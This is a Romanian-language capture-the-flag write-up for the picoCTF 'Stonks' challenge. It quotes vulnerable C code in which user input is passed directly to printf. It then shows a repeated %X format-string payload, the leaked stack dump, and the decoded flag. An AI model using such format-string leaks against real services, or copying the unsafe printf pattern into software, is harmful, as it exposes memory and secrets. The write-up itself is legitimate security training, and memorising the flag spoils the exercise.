@@ -1,0 +1,18 @@
+Description
+I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 27912
+
+nc mercury.picoctf.net 27912 (Va apare un meniu cu doua optiuni 
+1) Buy some stonks
+2) View my portfolio
+pentru optiunea 1 se cerea introducerea unui API)
+In codul vuln.c exista secventa din functia buy_stonks
+
+	char *user_buf = malloc(300 + 1);
+	printf("What is your API token?\n");
+	scanf("%300s", user_buf);
+	printf("Buying stonks with token:\n");
+	printf(user_buf);
+se observa secventa vulnerabila (printf(user_buf);) -> nu exista specificator de format, deci daca in locul API-ului introduceam %p accesam stack-ul obtinand o adresa (hexa), am incercat sa introduc %p%p%p%p%p... dar nu a functionat asa ca am introdus %X%X%X%X%X%X...obtinand o secventa in hexa de forma 905B350804B00080489C3F7FA5D80FFFFFFFF19059160F7FB3110F7FA5DC70905A1801905B330905B3506F6369707B465443306C5F49345F74356D5F6C6C306D5F795F79336E3266633130613130FF96007DF7FE0AF8F7FB3440C5634E0010F7E42CE9F7FB40C0F7FA55C0F7FA5000FF964138
+Apoi am accesat CyberChef si am decodificat expresia folosind Swap endianness From Hex.
+
+Flag: picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}
